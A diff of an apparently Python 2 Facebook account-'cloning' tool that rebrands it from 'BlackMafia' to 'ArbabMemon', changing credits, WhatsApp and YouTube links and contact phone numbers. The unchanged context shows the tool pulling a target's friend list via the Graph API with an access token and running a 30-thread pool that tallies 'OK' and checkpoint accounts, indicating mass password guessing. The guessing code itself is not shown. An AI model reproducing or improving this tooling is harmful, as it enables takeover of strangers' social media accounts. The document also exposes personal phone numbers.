@@ -1368,9 +1366,9 @@ def pilih_hack():
 	for o in titik:
 		print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)
 	print "\n\033[1;91m«--•◈••◈•---\x1b[1;95m•◈•Stop Process Press CTRL+Z•◈•\033[1;91m---•◈••◈•-»"
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')
-	print "\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	
 			
 	def main(arg):
@@ -1589,8 +1587,8 @@ def pilih_hack():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By ArbabMemon--•◈•---»" #Dev:Arbab_Memon
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
@@ -1606,10 +1604,10 @@ def pilih_hack():
          Checkpoint ID Open After 7 Days
 
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....lovehacker  BlackMafia....... \033[1;95m :
+: \033[1;91m ....ArbabMemon  TheBaziger....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;91m +923094161457"""
+              \033[1;91m +923003023263"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
@@ -1628,9 +1626,9 @@ def black():
 	print logo10
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;97mClone Friend List Public ID."
         time.sleep(0.05)
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;97mBlack Mafia WhatsApp Group USA."
+        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;97mArbab WhatsApp Group USA."
         time.sleep(0.05)
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;97mBlack Mafia Youtube Chenal."
+        print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;97mArbab Youtube Chenal."
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_black()
@@ -1644,7 +1642,7 @@ def pilih_black():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -1659,10 +1657,10 @@ def pilih_black():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
+	        os.system('xdg-open https://chat.whatsapp.com/LZKFT41qmVbKVKNHE0NkXK')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -1676,9 +1674,9 @@ def pilih_black():
 	for o in titik:
 		print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)
 	print "\n\033[1;91m«--•◈••◈•---\x1b[1;95m•◈•Stop Process Press CTRL+Z•◈•\033[1;91m---•◈••◈•-»"
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	
 			
 	def main(arg):
@@ -1896,8 +1894,8 @@ def pilih_black():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mArbabMemon\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By Arbab-Memon--•◈•---»" #Dev:Arbab_Memon
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
@@ -1916,10 +1914,10 @@ ______________☆____________★______________
          Checkpoint ID Open After 7 Days
 
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....lovehacker  BlackMafia....... \033[1;95m :
+: \033[1;91m ....ArbabMemon  TheBaziger....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;91m +923094161457"""
+              \033[1;91m +923003023263"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
@@ -1969,10 +1967,10 @@ def pilih_mafia():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://chat.whatsapp.com/FEs5BfBzpNY3oMSgDxo5pN')
+	        os.system('xdg-open https://chat.whatsapp.com/LZKFT41qmVbKVKNHE0NkXK')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -2281,10 +2279,10 @@ def pilih_test():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://chat.whatsapp.com/FEs5BfBzpNY3oMSgDxo5pN')
+	        os.system('xdg-open https://chat.whatsapp.com/LZKFT41qmVbKVKNHE0NkXK')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -2585,10 +2583,10 @@ def pilih_super():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://chat.whatsapp.com/FEs5BfBzpNY3oMSgDxo5pN')
+	        os.system('xdg-open https://chat.whatsapp.com/LZKFT41qmVbKVKNHE0NkXK')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -3058,10 +3056,10 @@ def pilih_phone():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://chat.whatsapp.com/FEs5BfBzpNY3oMSgDxo5pN')
+	        os.system('xdg-open https://chat.whatsapp.com/LZKFT41qmVbKVKNHE0NkXK')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -3376,10 +3374,10 @@ def pilih_mail():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://chat.whatsapp.com/FEs5BfBzpNY3oMSgDxo5pN')
+	        os.system('xdg-open https://chat.whatsapp.com/LZKFT41qmVbKVKNHE0NkXK')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -3687,10 +3685,10 @@ def pilih_isi():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://chat.whatsapp.com/FEs5BfBzpNY3oMSgDxo5pN')
+	        os.system('xdg-open https://chat.whatsapp.com/LZKFT41qmVbKVKNHE0NkXK')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -3994,10 +3992,10 @@ def pilih_army():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://chat.whatsapp.com/FEs5BfBzpNY3oMSgDxo5pN')
+	        os.system('xdg-open https://chat.whatsapp.com/LZKFT41qmVbKVKNHE0NkXK')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q')
 	        menu()
 	elif peak =="0":
 		menu()
